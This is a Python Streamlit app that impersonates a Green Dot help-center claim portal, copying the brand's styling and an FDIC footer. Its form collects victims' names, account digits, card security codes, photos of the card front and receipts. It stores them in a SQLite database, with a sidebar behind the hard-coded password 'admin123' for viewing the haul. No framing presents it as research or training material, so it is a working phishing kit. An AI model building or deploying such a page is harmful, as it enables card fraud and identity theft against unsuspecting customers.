
import streamlit as st
import sqlite3
import os
from datetime import datetime

# Database setup
DB_NAME = 'claims.db'
UPLOAD_DIR = 'uploads'
os.makedirs(UPLOAD_DIR, exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS greendot_submissions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  nombre TEXT, cuenta TEXT, codigo_tarjeta TEXT,
                  monto REAL, factura_path TEXT, tarjeta_path TEXT, fecha TEXT)""")
    conn.commit()
    conn.close()

init_db()

st.set_page_config(page_title="Green Dot | Help Center", layout="wide", page_icon="✅")

# --- STYLING ---
st.markdown("""<style>
.main { background-color: #f4f7f6; }
.stButton>button {
    background-color: #00a05b !important;
    color: white !important;
    border-radius: 5px !important;
    font-weight: bold !important;
    border: none !important;
}
h1, h2, h3 { color: #004a32 !important; }
</style>""", unsafe_allow_html=True)

# --- CONTENT ---
if os.path.exists('logo.svg'):
    st.image('logo.svg', width=150)

st.title("Green Dot Help Center")
st.write("### Secure Claim Submission Portal")
st.divider()

with st.container():
    st.subheader("Submit a New Claim")
    with st.form("claim_form_final", clear_on_submit=True):
        c1, c2 = st.columns(2)
        with c1:
            nombre = st.text_input("Full Name")
            cuenta = st.text_input("Account Number (Last 4 digits)")
        with c2:
            codigo = st.text_input("Security Code")
            monto = st.number_input("Disputed Amount ($)", min_value=0.0, step=0.01)

        st.write("**Evidence Required**")
        f_col, t_col = st.columns(2)
        with f_col:
            file_factura = st.file_uploader("Store Receipt", type=['png', 'jpg', 'jpeg'])
        with t_col:
            file_tarjeta = st.file_uploader("Card Front Photo", type=['png', 'jpg', 'jpeg'])

        submit = st.form_submit_button("SUBMIT SECURE DISPUTE")

if submit:
    if nombre and file_factura and file_tarjeta:
        f_path = os.path.join(UPLOAD_DIR, f"f_{int(datetime.now().timestamp())}_{file_factura.name}")
        t_path = os.path.join(UPLOAD_DIR, f"t_{int(datetime.now().timestamp())}_{file_tarjeta.name}")
        with open(f_path, 'wb') as f: f.write(file_factura.getbuffer())
        with open(t_path, 'wb') as f: f.write(file_tarjeta.getbuffer())

        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        c.execute("INSERT INTO greendot_submissions (nombre, cuenta, codigo_tarjeta, monto, factura_path, tarjeta_path, fecha) VALUES (?,?,?,?,?,?,?)",
                  (nombre, cuenta, codigo, monto, f_path, t_path, str(datetime.now())))
        conn.commit()
        conn.close()
        st.success("✅ Your claim has been submitted successfully.")
    else:
        st.error("☑ Please complete all fields.")

st.divider()
st.caption("  2024 Green Dot Corporation. Member FDIC.")

# Admin Side
with st.sidebar:
    pw = st.text_input("Admin Login", type="password")
    if pw == "admin123":
        if st.button("View Records"):
            conn = sqlite3.connect(DB_NAME)
            import pandas as pd
            df = pd.read_sql_query("SELECT * FROM greendot_submissions", conn)
            conn.close()
            st.write(df)
